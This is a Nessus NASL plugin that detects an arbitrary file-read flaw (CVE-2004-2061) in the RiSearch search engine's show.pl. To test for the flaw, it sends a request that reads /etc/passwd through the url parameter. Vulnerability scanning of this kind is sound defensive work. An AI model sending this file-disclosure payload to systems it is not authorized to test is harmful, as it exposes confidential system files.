#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from
#  (C) Tenable Netwok Security
#
# Ref: IRM PLC <advisories at irmplc dot com>
#
# This script is released under the GNU GPLv2

if(description)
{
script_id(14222);
script_cve_id("CVE-2004-2061");
script_bugtraq_id(10812);

 if ( defined_func("script_xref") ) script_xref(name:"OSVDB", value:"8266");

 name["english"] = "RiSearch Arbitrary File Access";

 script_name(english:name["english"]);
 script_version ("$Revision: 1.10 $"); 
 desc["english"] = "
The remote host seems to be running RiSearch, a local search engine.

This version contains a flaw that may lead to an unauthorized 
information disclosure. The issue is triggered when an arbitary 
local file path is passed to show.pl, which will disclose the 
file contents resulting in a loss of confidentiality.

An attacker, exploiting this flaw, would be able to gain access
to potentially confidential files which would be useful in 
elevating privileges on the remote machine.

Solution : Upgrade to the latest version of this software.
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Determines the presence of RiSearch show.pl";

 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004 David Maciejak");
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0);

foreach dir ( cgi_dirs() )
{
	req = http_get(port:port, item:dir + "/search/show.pl?url=file:/etc/passwd");
 	res = http_keepalive_send_recv(port:port, data:req);
 	if ( res == NULL ) 
		exit(0);
 	if ( "root:" >< res &&
      		"adm:" >< res ) 
	{
	 	security_hole(port);
	 	exit(0);
	}
}
